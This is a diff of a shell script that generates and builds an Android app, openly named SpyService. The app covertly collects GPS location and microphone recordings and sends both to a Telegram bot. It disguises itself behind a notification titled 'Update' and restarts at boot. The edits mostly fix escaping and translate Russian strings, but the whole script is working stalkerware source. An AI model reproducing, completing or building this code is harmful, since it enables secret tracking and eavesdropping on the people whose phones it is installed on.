@@ -114,7 +114,7 @@ class MainActivity : AppCompatActivity() {
 }
 EOF
 
-# 4. SpyService.kt (Сбор данных)
+# 4. SpyService.kt
 cat <<EOF > $PROJECT/app/src/main/java/$PKG_PATH/SpyService.kt
 package $PACKAGE
 import android.app.*
@@ -144,7 +144,7 @@ class SpyService : Service() {
         val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         try {
             lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10f, object : android.location.LocationListener {
-                override fun onLocationChanged(l: Location) { sendTG("📍 GPS: ${l.latitude}, ${l.longitude}") }
+                override fun onLocationChanged(l: Location) { sendTG("GPS: \${l.latitude}, \${l.longitude}") }
                 override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
                 override fun onProviderEnabled(p: String) {}
                 override fun onProviderDisabled(p: String) {}
@@ -162,7 +162,7 @@ class SpyService : Service() {
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(NotificationChannel(id, "Sys", NotificationManager.IMPORTANCE_LOW))
         }
-        return Notification.Builder(this, id).setContentTitle("Обновление").setSmallIcon(android.R.drawable.stat_notify_sync).build()
+        return Notification.Builder(this, id).setContentTitle("Update").setSmallIcon(android.R.drawable.stat_notify_sync).build()
     }
 
     private fun record() {
@@ -184,7 +184,7 @@ class SpyService : Service() {
 
     private fun sendTG(t: String) {
         val b = FormBody.Builder().add("chat_id", CHAT).add("text", t).build()
-        client.newCall(Request.Builder().url("https://api.telegram.org/bot$TOKEN/sendMessage").post(b).build()).enqueue(object : Callback {
+        client.newCall(Request.Builder().url("https://api.telegram.org/bot\$TOKEN/sendMessage").post(b).build()).enqueue(object : Callback {
             override fun onFailure(c: Call, e: java.io.IOException) {}
             override fun onResponse(c: Call, r: Response) { r.close() }
         })
@@ -195,7 +195,7 @@ class SpyService : Service() {
             .addFormDataPart("chat_id", CHAT)
             .addFormDataPart("audio", f.name, RequestBody.create("audio/mp4".toMediaTypeOrNull(), f))
             .build()
-        client.newCall(Request.Builder().url("https://api.telegram.org/bot$TOKEN/sendAudio").post(b).build()).enqueue(object : Callback {
+        client.newCall(Request.Builder().url("https://api.telegram.org/bot\$TOKEN/sendAudio").post(b).build()).enqueue(object : Callback {
             override fun onFailure(c: Call, e: java.io.IOException) { f.delete() }
             override fun onResponse(c: Call, r: Response) { r.close(); f.delete() }
         })
@@ -222,10 +222,9 @@ class BootReceiver : BroadcastReceiver() {
 }
 EOF
 
-# 6. Сборка (ИСПРАВЛЕНО)
+# 6. Сборка
 echo "[*] Сборка APK..."
 cd $PROJECT
-# Принудительно указываем версию Gradle 8.2 для совместимости
 gradle wrapper --gradle-version 8.2
 chmod +x gradlew
 ./gradlew assembleDebug
